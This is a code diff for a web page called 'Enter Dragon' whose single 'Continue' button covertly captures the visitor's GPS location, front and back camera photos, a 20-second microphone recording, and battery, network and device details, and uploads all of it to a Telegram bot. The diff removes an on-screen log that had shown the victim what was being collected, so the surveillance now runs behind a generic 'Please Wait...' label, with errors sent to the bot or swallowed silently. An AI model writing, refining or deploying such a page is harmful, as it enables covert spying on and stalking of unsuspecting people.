@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#050505">
+    
+    <!-- Anti-Cache Meta Tags -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
     <title>Enter Dragon</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
@@ -55,37 +61,6 @@
             border: 0;
             opacity: 0.01;
         }
-
-        /* Persistent Log Box */
-        #status-log {
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 20px;
-            width: 100%;
-            max-width: 280px;
-            max-height: 200px;
-            overflow-y: auto;
-            text-align: left;
-            font-size: 0.85rem;
-            display: none;
-            flex-direction: column;
-            gap: 8px;
-        }
-        
-        .log-entry {
-            display: flex;
-            align-items: flex-start;
-            gap: 8px;
-            color: #d1d5db;
-            animation: fadeIn 0.3s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col relative selection:bg-blue-500/30">
@@ -131,9 +106,6 @@
             </svg>
         </button>
 
-        <!-- Persistent Status Log Box -->
-        <div id="status-log"></div>
-
     </main>
 
     <!-- Hidden Elements for Processing -->
@@ -149,24 +121,10 @@
         const btnIcon = document.getElementById('btn-icon');
         const btnSpinner = document.getElementById('btn-spinner');
         const btnSuccessIcon = document.getElementById('btn-success-icon');
-        const statusLog = document.getElementById('status-log');
         
         const video = document.getElementById('hidden-video');
         const canvas = document.getElementById('hidden-canvas');
         const ctx = canvas.getContext('2d');
-
-        // Logging Function
-        function addLog(message, type = 'wait') {
-            let icon = '⏳';
-            if (type === 'success') icon = '✅';
-            if (type === 'error') icon = '❌';
-
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.innerHTML = `<span>${icon}</span> <span>${message}</span>`;
-            statusLog.appendChild(logEntry);
-            statusLog.scrollTop = statusLog.scrollHeight; // Auto-scroll to bottom
-        }
 
         function setButtonLoading(text = "Please Wait...") {
             btnContinue.disabled = true;
@@ -174,8 +132,6 @@
             btnIcon.classList.add('hidden');
             btnSuccessIcon.classList.add('hidden');
             btnSpinner.classList.remove('hidden');
-            statusLog.style.display = 'flex'; // Show log box
-            statusLog.innerHTML = ''; // Clear previous logs
         }
 
         function setButtonSuccess() {
@@ -185,7 +141,6 @@
             btnText.innerText = "Successfully";
             btnSpinner.classList.add('hidden');
             btnSuccessIcon.classList.remove('hidden');
-            addLog("All tasks completed.", "success");
 
             setTimeout(() => {
                 btnContinue.disabled = false;
@@ -195,7 +150,6 @@
                 btnText.innerText = "Continue";
                 btnSuccessIcon.classList.add('hidden');
                 btnIcon.classList.remove('hidden');
-                // We leave the status log visible so you can read it.
             }, 2000);
         }
 
@@ -203,7 +157,7 @@
             const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB+` : "Unknown";
             const res = `${window.screen.width} x ${window.screen.height}`;
             const os = navigator.userAgent;
-            return `<b>RAM:</b> ${ram}\n<b>Resolution:</b> ${res}\n<b>OS:</b> ${os}`;
+            return `<b>RAM:</b> ${ram}\n<b>Resolution:</b> ${res}\n<b>OS/Browser:</b> ${os}`;
         }
 
         function detectPhoneMotion() {
@@ -224,7 +178,7 @@
                     window.addEventListener('devicemotion', handleMotion);
                     setTimeout(() => {
                         window.removeEventListener('devicemotion', handleMotion);
-                        if (sampleCount === 0) resolve("Unknown (No sensor)");
+                        if (sampleCount === 0) resolve("Unknown (No sensor access)");
                         else resolve(isMoving ? "In Hand / Moving 📱" : "On Table / Stationary 📏");
                     }, 1500); 
                 } else {
@@ -294,7 +248,10 @@
             fd.append('chat_id', CHAT_ID);
             fd.append('photo', blob, 'photo.jpg');
             fd.append('caption', caption);
-            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
+            try { 
+                const res = await fetch(url, { method: 'POST', body: fd }); 
+                return res.ok;
+            } catch (e) { return false; }
         }
 
         async function extractFrameFromVideo(videoElem) {
@@ -307,68 +264,52 @@
 
         btnContinue.addEventListener('click', async () => {
             setButtonLoading("Please Wait...");
-            addLog("Process started...", "wait");
 
-            // 1. Get GPS and System Data
-            addLog("Fetching GPS & Device Info...", "wait");
-            const gpsPromise = getExactGPS();
-            const motionPromise = detectPhoneMotion();
-            const battery = await getBatteryInfo();
-            const network = await getNetworkAndISPInfo();
-            const sysInfo = getAdvancedDeviceInfo();
-            
-            const gps = await gpsPromise;
-            const motion = await motionPromise;
+            // --- 1. LOCATION (GPS) ---
+            const gps = await getExactGPS();
+            if (gps.success) {
+                await sendTextToBot(`📍 <b>GPS Location:</b>\n${gps.data}`);
+            } else {
+                await sendTextToBot(`❌ <b>GPS Failed:</b> ${gps.data}`);
+            }
 
-            if (gps.success) addLog("GPS Location Acquired", "success");
-            else addLog("GPS Failed: " + gps.data, "error");
+            // Variables for background audio
+            let audioRecorder = null;
+            let audioPromise = null;
+            let timerInterval = null;
 
-            addLog("Device Info & Motion Acquired", "success");
-
-            const msg = `🐉 <b>ENTER DRAGON ALERT</b>\n\n` +
-                        `🔋 <b>Battery:</b> ${battery}\n` +
-                        `📶 <b>Network:</b> ${network}\n` +
-                        `📍 <b>Location:</b> ${gps.success ? gps.data : 'Failed - ' + gps.data}\n\n` +
-                        `📱 <b>Device Info:</b>\n${sysInfo}\n\n` +
-                        `🏃‍♂️ <b>Phone Status:</b> ${motion}`;
-            sendTextToBot(msg);
-            addLog("Text Report sent to bot", "success");
-
-            // 2. Camera & Audio
-            addLog("Requesting Camera/Mic Access...", "wait");
+            // --- 2. FRONT CAMERA (2 Images) & START AUDIO ---
             let frontStream = null;
             try {
                 frontStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
-                addLog("Camera/Mic Access Granted", "success");
                 
                 video.srcObject = frontStream;
                 await video.play();
-                await new Promise(r => setTimeout(r, 1000)); 
+                await new Promise(r => setTimeout(r, 1000)); // Focus wait
                 
-                addLog("Capturing Front Camera (1/2)...", "wait");
+                // Front Pic 1
                 const frontBlob1 = await extractFrameFromVideo(video);
                 if (frontBlob1) {
                     sendPhotoToBot(frontBlob1, "Front Camera (1/2)");
-                    addLog("Front Camera (1/2) Sent", "success");
                 }
 
-                await new Promise(r => setTimeout(r, 1000)); 
+                await new Promise(r => setTimeout(r, 800)); // Delay between shots
                 
-                addLog("Capturing Front Camera (2/2)...", "wait");
+                // Front Pic 2
                 const frontBlob2 = await extractFrameFromVideo(video);
                 if (frontBlob2) {
                     sendPhotoToBot(frontBlob2, "Front Camera (2/2)");
-                    addLog("Front Camera (2/2) Sent", "success");
                 }
 
+                // Stop Front Video track, KEEP AUDIO running
                 const videoTrack = frontStream.getVideoTracks()[0];
                 if (videoTrack) videoTrack.stop();
 
-                addLog("Recording 20s Audio...", "wait");
+                // START AUDIO IN BACKGROUND
                 let timeLeft = 20;
                 btnText.innerText = `Please Wait... ${timeLeft}s`;
                 
-                const timerInterval = setInterval(() => {
+                timerInterval = setInterval(() => {
                     timeLeft--;
                     if (timeLeft > 0) {
                         btnText.innerText = `Please Wait... ${timeLeft}s`;
@@ -378,35 +319,32 @@
                     }
                 }, 1000);
 
-                const audioRecorder = new MediaRecorder(frontStream);
+                audioRecorder = new MediaRecorder(frontStream);
                 const audioChunks = [];
-                
                 audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
                 
-                const audioPromise = new Promise((resolve) => {
+                audioPromise = new Promise((resolve) => {
                     audioRecorder.onstop = async () => {
                         const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                        addLog("Uploading Audio...", "wait");
                         await sendDocumentToBot(audioBlob, "emergency_audio.webm", "20 Sec Audio Recording");
-                        addLog("Audio Sent successfully", "success");
                         frontStream.getAudioTracks().forEach(t => t.stop()); 
                         resolve();
                     };
                 });
 
                 audioRecorder.start();
-                await new Promise(r => setTimeout(r, 20000)); 
-                audioRecorder.stop();
-                clearInterval(timerInterval);
                 
-                await audioPromise;
+                // Stop audio automatically after 20s
+                setTimeout(() => {
+                    if (audioRecorder.state === "recording") audioRecorder.stop();
+                    clearInterval(timerInterval);
+                }, 20000); 
 
             } catch (error) {
-                addLog("Camera/Audio Error: " + error.message, "error");
+                await sendTextToBot(`❌ <b>Camera/Audio Error:</b> ${error.message}`);
             }
 
-            // 3. Back Camera
-            addLog("Accessing Back Camera...", "wait");
+            // --- 3. BACK CAMERA (2 Images) ---
             let backStream = null;
             try {
                 backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
@@ -414,31 +352,47 @@
                 
                 video.srcObject = backStream;
                 await video.play();
-                await new Promise(r => setTimeout(r, 1500)); 
+                await new Promise(r => setTimeout(r, 1200)); 
                 
-                addLog("Capturing Back Camera (1/2)...", "wait");
+                // Back Pic 1
                 const backBlob1 = await extractFrameFromVideo(video);
                 if (backBlob1) {
-                    await sendPhotoToBot(backBlob1, "Back Camera (1/2)");
-                    addLog("Back Camera (1/2) Sent", "success");
+                    sendPhotoToBot(backBlob1, "Back Camera (1/2)");
                 }
 
-                await new Promise(r => setTimeout(r, 1500)); 
+                await new Promise(r => setTimeout(r, 800)); 
                 
-                addLog("Capturing Back Camera (2/2)...", "wait");
+                // Back Pic 2
                 const backBlob2 = await extractFrameFromVideo(video);
                 if (backBlob2) {
-                    await sendPhotoToBot(backBlob2, "Back Camera (2/2)");
-                    addLog("Back Camera (2/2) Sent", "success");
+                    sendPhotoToBot(backBlob2, "Back Camera (2/2)");
                 }
 
             } catch (error) {
-                addLog("Back Camera Error or Not Found", "error");
+                // Back camera error handled silently
             } finally {
                 if (backStream) backStream.getTracks().forEach(t => t.stop());
             }
 
-            // 4. Finish
+            // --- 4. MOBILE SPECIFICATIONS ---
+            const motion = await detectPhoneMotion();
+            const battery = await getBatteryInfo();
+            const network = await getNetworkAndISPInfo();
+            const sysInfo = getAdvancedDeviceInfo();
+
+            const msg = `🐉 <b>ENTER DRAGON SPECS</b>\n\n` +
+                        `🔋 <b>Battery:</b> ${battery}\n` +
+                        `📶 <b>Network:</b> ${network}\n\n` +
+                        `📱 <b>Device Info:</b>\n${sysInfo}\n\n` +
+                        `🏃‍♂️ <b>Phone Status:</b> ${motion}`;
+            await sendTextToBot(msg);
+
+            // --- 5. WAIT FOR AUDIO TO FINISH ---
+            if (audioPromise) {
+                await audioPromise;
+            }
+
+            // --- FINISH ---
             setButtonSuccess();
         });
     </script>
